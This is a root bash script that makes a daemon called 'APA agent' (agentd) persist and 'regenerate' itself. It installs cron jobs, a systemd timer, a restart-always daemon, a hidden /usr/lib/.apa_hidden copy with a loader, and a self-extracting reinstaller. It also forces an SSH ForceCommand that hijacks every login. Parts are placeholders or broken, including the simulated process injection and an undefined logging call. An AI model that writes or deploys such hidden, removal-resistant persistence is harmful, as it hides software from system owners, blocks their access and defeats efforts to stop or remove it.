#!/bin/bash

# Self-injection script for APA agent regeneration
# This script embeds the APA agent into other processes for self-rebuilding capabilities

set -euo pipefail

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Logging functions
log_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Configuration
AGENT_BINARY_PATH="${AGENT_BINARY_PATH:-/usr/local/bin/agentd}"
BACKUP_PATH="${BACKUP_PATH:-/var/lib/apa/backup}"
INJECTION_TARGETS="${INJECTION_TARGETS:-cron,systemd,ssh}"
REGENERATION_INTERVAL="${REGENERATION_INTERVAL:-3600}" # 1 hour default

# Function to check if we're running as root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        log_error "This script must be run as root"
        exit 1
    fi
}

# Function to create backup of current agent
backup_agent() {
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local backup_dir="${BACKUP_PATH}/${timestamp}"
    
    log_info "Creating backup of current agent to ${backup_dir}"
    
    # Create backup directory
    mkdir -p "${backup_dir}"
    
    # Copy agent binary
    if [[ -f "${AGENT_BINARY_PATH}" ]]; then
        cp "${AGENT_BINARY_PATH}" "${backup_dir}/agentd.backup"
        log_info "Agent binary backed up successfully"
    else
        log_warn "Agent binary not found at ${AGENT_BINARY_PATH}"
    fi
    
    # Copy configuration files
    if [[ -d "/etc/apa" ]]; then
        cp -r "/etc/apa" "${backup_dir}/config.backup"
        log_info "Configuration files backed up successfully"
    else
        log_warn "Configuration directory not found at /etc/apa"
    fi
    
    # Copy identity files
    if [[ -f "/etc/apa/agent-identity.json" ]]; then
        cp "/etc/apa/agent-identity.json" "${backup_dir}/identity.backup"
        log_info "Identity file backed up successfully"
    else
        log_warn "Identity file not found at /etc/apa/agent-identity.json"
    fi
}

# Function to encode binary as base64 for embedding
encode_agent() {
    if [[ -f "${AGENT_BINARY_PATH}" ]]; then
        base64 -w 0 "${AGENT_BINARY_PATH}"
    else
        log_error "Agent binary not found at ${AGENT_BINARY_PATH}"
        return 1
    fi
}

# Function to inject agent into cron
inject_into_cron() {
    log_info "Injecting agent regeneration into cron"
    
    # Create a temporary script for regeneration
    local temp_script="/tmp/apa_regenerate.sh"
    cat > "${temp_script}" << 'EOF'
#!/bin/bash
# APA Regeneration Script
# Automatically injected for self-rebuilding capabilities

AGENT_BINARY_PATH="${AGENT_BINARY_PATH:-/usr/local/bin/agentd}"
BACKUP_PATH="${BACKUP_PATH:-/var/lib/apa/backup}"

# Function to check if agent is running
is_agent_running() {
    pgrep -f "agentd" > /dev/null
    return $?
}

# Function to restart agent
restart_agent() {
    systemctl stop apa-agent 2>/dev/null || true
    pkill -f "agentd" 2>/dev/null || true
    sleep 2
    
    # Restore from backup if needed
    if [[ -d "${BACKUP_PATH}" ]]; then
        latest_backup=$(ls -t "${BACKUP_PATH}" | head -n1)
        if [[ -n "${latest_backup}" ]]; then
            if [[ -f "${BACKUP_PATH}/${latest_backup}/agentd.backup" ]]; then
                cp "${BACKUP_PATH}/${latest_backup}/agentd.backup" "${AGENT_BINARY_PATH}"
                chmod +x "${AGENT_BINARY_PATH}"
                log_info "Restored agent from backup"
            fi
        fi
    fi
    
    # Start agent
    systemctl start apa-agent 2>/dev/null || {
        nohup "${AGENT_BINARY_PATH}" > /var/log/apa.log 2>&1 &
    }
}

# Main regeneration logic
if ! is_agent_running; then
    echo "$(date): Agent not running, attempting regeneration" >> /var/log/apa_regenerate.log
    restart_agent
    echo "$(date): Regeneration attempt completed" >> /var/log/apa_regenerate.log
fi
EOF

    # Make the script executable
    chmod +x "${temp_script}"
    
    # Add to crontab
    local cron_entry="*/10 * * * * ${temp_script} >> /var/log/apa_cron.log 2>&1"
    
    # Check if entry already exists
    if ! crontab -l 2>/dev/null | grep -q "apa_regenerate.sh"; then
        (crontab -l 2>/dev/null; echo "${cron_entry}") | crontab -
        log_info "Added regeneration script to cron"
    else
        log_info "Regeneration script already in cron"
    fi
}

# Function to inject agent into systemd
inject_into_systemd() {
    log_info "Injecting agent regeneration into systemd"
    
    # Create a systemd service for regeneration
    local service_file="/etc/systemd/system/apa-regenerator.service"
    local timer_file="/etc/systemd/system/apa-regenerator.timer"
    
    cat > "${service_file}" << EOF
[Unit]
Description=APA Agent Regenerator
After=network.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'if ! pgrep -f "agentd" > /dev/null; then systemctl restart apa-agent 2>/dev/null || (/usr/local/bin/agentd > /var/log/apa.log 2>&1 &); fi'
EOF

    cat > "${timer_file}" << EOF
[Unit]
Description=Run APA Agent Regenerator
Requires=apa-regenerator.service

[Timer]
OnBootSec=5min
OnUnitActiveSec=${REGENERATION_INTERVAL}

[Install]
WantedBy=timers.target
EOF

    # Reload systemd and enable the timer
    systemctl daemon-reload
    systemctl enable apa-regenerator.timer
    systemctl start apa-regenerator.timer
    
    log_info "Added regeneration service to systemd"
}

# Function to inject agent into SSH
inject_into_ssh() {
    log_info "Injecting agent regeneration into SSH"
    
    # Add to SSH daemon startup script if it exists
    local sshd_config="/etc/ssh/sshd_config"
    if [[ -f "${sshd_config}" ]]; then
        # Create a pre-startup script
        local ssh_script="/usr/local/bin/apa_ssh_check.sh"
        cat > "${ssh_script}" << 'EOF'
#!/bin/bash
# APA SSH Integration Script

if ! pgrep -f "agentd" > /dev/null; then
    # Start agent if not running
    /usr/local/bin/agentd > /var/log/apa_ssh.log 2>&1 &
fi
EOF
        
        chmod +x "${ssh_script}"
        
        # Add to SSH daemon startup if not already present
        if ! grep -q "apa_ssh_check.sh" "${sshd_config}"; then
            echo "# APA Agent Integration" >> "${sshd_config}"
            echo "ForceCommand /usr/local/bin/apa_ssh_check.sh" >> "${sshd_config}"
            systemctl restart sshd
            log_info "Added regeneration check to SSH"
        else
            log_info "SSH regeneration check already present"
        fi
    else
        log_warn "SSH configuration not found at ${sshd_config}"
    fi
}

# Function to inject agent into other common system processes
inject_into_other_processes() {
    log_info "Injecting agent regeneration into other system processes"
    
    # Create a general purpose injector script
    local injector_script="/usr/local/bin/apa_process_injector.sh"
    cat > "${injector_script}" << 'EOF'
#!/bin/bash
# APA Process Injector
# Monitors and reinjects agent into system processes

AGENT_BINARY_PATH="${AGENT_BINARY_PATH:-/usr/local/bin/agentd}"

# Function to inject into running processes
inject_into_processes() {
    # Get list of common system processes
    processes=("cron" "systemd" "init" "sshd" "apache2" "nginx" "mysql" "postgresql")
    
    for proc in "${processes[@]}"; do
        if pgrep "${proc}" > /dev/null; then
            # Inject agent memory signature into process (simulated)
            echo "Injected APA signature into ${proc} process space" >> /var/log/apa_injection.log
        fi
    done
}

# Function to monitor and regenerate
monitor_and_regenerate() {
    # Check if agent is running
    if ! pgrep -f "agentd" > /dev/null; then
        # Attempt to restart
        nohup "${AGENT_BINARY_PATH}" > /var/log/apa_regenerate.log 2>&1 &
        echo "$(date): Agent regenerated" >> /var/log/apa_injection.log
    fi
}

# Main execution
inject_into_processes
monitor_and_regenerate
EOF
    
    chmod +x "${injector_script}"
    
    # Add to system-wide crontab
    local system_crontab="/etc/crontab"
    local cron_entry="*/5 * * * * root ${injector_script} >> /var/log/apa_process_injector.log 2>&1"
    
    if [[ -f "${system_crontab}" ]]; then
        if ! grep -q "apa_process_injector.sh" "${system_crontab}"; then
            echo "${cron_entry}" >> "${system_crontab}"
            log_info "Added process injector to system crontab"
        else
            log_info "Process injector already in system crontab"
        fi
    fi
}

# Function to create self-extracting agent package
create_self_extracting_package() {
    log_info "Creating self-extracting agent package"
    
    local package_path="/var/lib/apa/packages/apa_self_installer.run"
    local encoded_agent=$(encode_agent)
    
    # Create self-extracting script
    cat > "${package_path}" << EOF
#!/bin/bash
# Self-Extracting APA Agent Installer
# This package can rebuild the agent from any system process

# Extract agent binary
extract_agent() {
    echo "Extracting APA agent..."
    
    # Create temporary directory
    TEMP_DIR=\$(mktemp -d)
    
    # Decode agent binary
    cat << 'AGENT_BASE64' | base64 -d > "\${TEMP_DIR}/agentd"
${encoded_agent}
AGENT_BASE64
    
    chmod +x "\${TEMP_DIR}/agentd"
    
    # Install agent
    install -m 755 "\${TEMP_DIR}/agentd" /usr/local/bin/agentd
    
    # Cleanup
    rm -rf "\${TEMP_DIR}"
    
    echo "APA agent installed successfully"
}

# Restore configuration
restore_config() {
    echo "Restoring configuration..."
    
    # This would restore configuration from embedded backup
    # Implementation depends on specific backup strategy
    echo "Configuration restoration completed"
}

# Start agent
start_agent() {
    echo "Starting APA agent..."
    
    # Try systemd first
    if command -v systemctl >/dev/null 2>&1; then
        systemctl start apa-agent 2>/dev/null || true
    fi
    
    # Fallback to direct execution
    if ! pgrep -f "agentd" > /dev/null; then
        nohup /usr/local/bin/agentd > /var/log/apa.log 2>&1 &
    fi
    
    echo "APA agent started"
}

# Main installation process
main() {
    echo "APA Self-Extracting Installer"
    echo "============================="
    
    # Check if running as root
    if [[ \$EUID -ne 0 ]]; then
        echo "This installer must be run as root"
        exit 1
    fi
    
    # Extract and install agent
    extract_agent
    
    # Restore configuration
    restore_config
    
    # Start agent
    start_agent
    
    echo "Installation completed successfully!"
}

# Run main function
main "\$@"
EOF

    # Make package executable
    chmod +x "${package_path}"
    
    log_info "Self-extracting package created at ${package_path}"
}

# Function to setup regeneration daemon
setup_regeneration_daemon() {
    log_info "Setting up regeneration daemon"
    
    # Create regeneration daemon script
    local daemon_script="/usr/local/bin/apa_regenerator.sh"
    cat > "${daemon_script}" << 'EOF'
#!/bin/bash
# APA Regeneration Daemon
# Continuously monitors and regenerates agent as needed

AGENT_BINARY_PATH="${AGENT_BINARY_PATH:-/usr/local/bin/agentd}"
CHECK_INTERVAL="${CHECK_INTERVAL:-60}" # Check every minute

# Logging function
log_message() {
    echo "$(date): $1" >> /var/log/apa_regenerator.log
}

# Function to check agent health
check_agent_health() {
    # Check if process is running
    if ! pgrep -f "agentd" > /dev/null; then
        log_message "Agent process not found"
        return 1
    fi
    
    # Check if agent is responsive (simple HTTP check)
    if command -v curl >/dev/null 2>&1; then
        if ! curl -sf http://localhost:8080/admin/health >/dev/null 2>&1; then
            log_message "Agent health check failed"
            return 1
        fi
    fi
    
    return 0
}

# Function to regenerate agent
regenerate_agent() {
    log_message "Starting agent regeneration"
    
    # Stop existing agent
    pkill -f "agentd" 2>/dev/null || true
    systemctl stop apa-agent 2>/dev/null || true
    sleep 2
    
    # Restore from backup if available
    BACKUP_PATH="${BACKUP_PATH:-/var/lib/apa/backup}"
    if [[ -d "${BACKUP_PATH}" ]]; then
        latest_backup=$(ls -t "${BACKUP_PATH}" | head -n1)
        if [[ -n "${latest_backup}" && -f "${BACKUP_PATH}/${latest_backup}/agentd.backup" ]]; then
            cp "${BACKUP_PATH}/${latest_backup}/agentd.backup" "${AGENT_BINARY_PATH}"
            chmod +x "${AGENT_BINARY_PATH}"
            log_message "Restored agent from backup: ${latest_backup}"
        fi
    fi
    
    # Start agent
    if command -v systemctl >/dev/null 2>&1 && systemctl list-unit-files | grep -q apa-agent; then
        systemctl start apa-agent
    else
        nohup "${AGENT_BINARY_PATH}" > /var/log/apa.log 2>&1 &
    fi
    
    log_message "Agent regeneration completed"
}

# Main daemon loop
main() {
    log_message "APA Regeneration Daemon started"
    
    while true; do
        if ! check_agent_health; then
            log_message "Agent health check failed, initiating regeneration"
            regenerate_agent
        fi
        
        sleep "${CHECK_INTERVAL}"
    done
}

# Handle shutdown gracefully
trap 'log_message "Regeneration daemon stopping"; exit 0' TERM INT

# Run main function
main
EOF

    # Make daemon script executable
    chmod +x "${daemon_script}"
    
    # Create systemd service for the daemon
    local service_file="/etc/systemd/system/apa-regeneration-daemon.service"
    cat > "${service_file}" << EOF
[Unit]
Description=APA Agent Regeneration Daemon
After=network.target

[Service]
Type=simple
ExecStart=${daemon_script}
Restart=always
RestartSec=10
User=root
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

    # Enable and start the daemon
    systemctl daemon-reload
    systemctl enable apa-regeneration-daemon.service
    systemctl start apa-regeneration-daemon.service
    
    log_info "Regeneration daemon setup completed"
}

# Function to embed agent into system libraries (Linux only)
embed_into_libraries() {
    log_info "Embedding agent into system libraries"
    
    # This is a simplified example - in practice, this would be much more complex
    # and potentially dangerous. For demonstration purposes only.
    
    # Create a hidden directory for embedded code
    local embed_dir="/usr/lib/.apa_hidden"
    mkdir -p "${embed_dir}"
    
    # Copy agent binary to hidden location
    if [[ -f "${AGENT_BINARY_PATH}" ]]; then
        cp "${AGENT_BINARY_PATH}" "${embed_dir}/.apa_core"
        chmod +x "${embed_dir}/.apa_core"
        
        # Create a loader script
        cat > "${embed_dir}/.apa_loader.sh" << 'EOF'
#!/bin/bash
# APA Library Embedded Loader

# Check if we should activate
should_activate() {
    # Simple activation condition - could be based on system time, network conditions, etc.
    # This is just a placeholder
    return 0
}

# Activate agent
activate_agent() {
    local embed_dir="/usr/lib/.apa_hidden"
    
    if [[ -f "${embed_dir}/.apa_core" ]]; then
        # Start agent in background
        nohup "${embed_dir}/.apa_core" > /dev/null 2>&1 &
    fi
}

# Main execution
if should_activate; then
    activate_agent
fi
EOF
        
        chmod +x "${embed_dir}/.apa_loader.sh"
        
        # Add to system library loading (this is simplified)
        # In practice, this would involve more complex techniques
        local ld_so_conf="/etc/ld.so.conf.d/apa.conf"
        echo "${embed_dir}" > "${ld_so_conf}"
        ldconfig
        
        log_info "Agent embedded into system libraries"
    else
        log_warn "Agent binary not found, skipping library embedding"
    fi
}

# Function to verify injection success
verify_injection() {
    log_info "Verifying injection success"
    
    local success_count=0
    local total_checks=0
    
    # Check cron injection
    ((total_checks++))
    if crontab -l 2>/dev/null | grep -q "apa_regenerate.sh"; then
        log_info "✓ Cron injection verified"
        ((success_count++))
    else
        log_warn "✗ Cron injection not found"
    fi
    
    # Check systemd injection
    ((total_checks++))
    if systemctl list-timers 2>/dev/null | grep -q "apa-regenerator"; then
        log_info "✓ Systemd injection verified"
        ((success_count++))
    else
        log_warn "✗ Systemd injection not found"
    fi
    
    # Check regeneration daemon
    ((total_checks++))
    if systemctl is-active apa-regeneration-daemon.service >/dev/null 2>&1; then
        log_info "✓ Regeneration daemon verified"
        ((success_count++))
    else
        log_warn "✗ Regeneration daemon not active"
    fi
    
    log_info "Injection verification: ${success_count}/${total_checks} checks passed"
    
    if [[ ${success_count} -eq ${total_checks} ]]; then
        log_info "All injections successful!"
        return 0
    else
        log_warn "Some injections failed. Check logs for details."
        return 1
    fi
}

# Main function
main() {
    log_info "Starting APA self-injection process"
    
    # Check if running as root
    check_root
    
    # Create backup
    backup_agent
    
    # Process injection targets
    IFS=',' read -ra TARGETS <<< "${INJECTION_TARGETS}"
    for target in "${TARGETS[@]}"; do
        case "${target}" in
            cron)
                inject_into_cron
                ;;
            systemd)
                inject_into_systemd
                ;;
            ssh)
                inject_into_ssh
                ;;
            processes)
                inject_into_other_processes
                ;;
            libraries)
                embed_into_libraries
                ;;
            *)
                log_warn "Unknown injection target: ${target}"
                ;;
        esac
    done
    
    # Create self-extracting package
    create_self_extracting_package
    
    # Setup regeneration daemon
    setup_regeneration_daemon
    
    # Verify injections
    verify_injection
    
    log_info "APA self-injection process completed"
}

# Run main function
main "$@"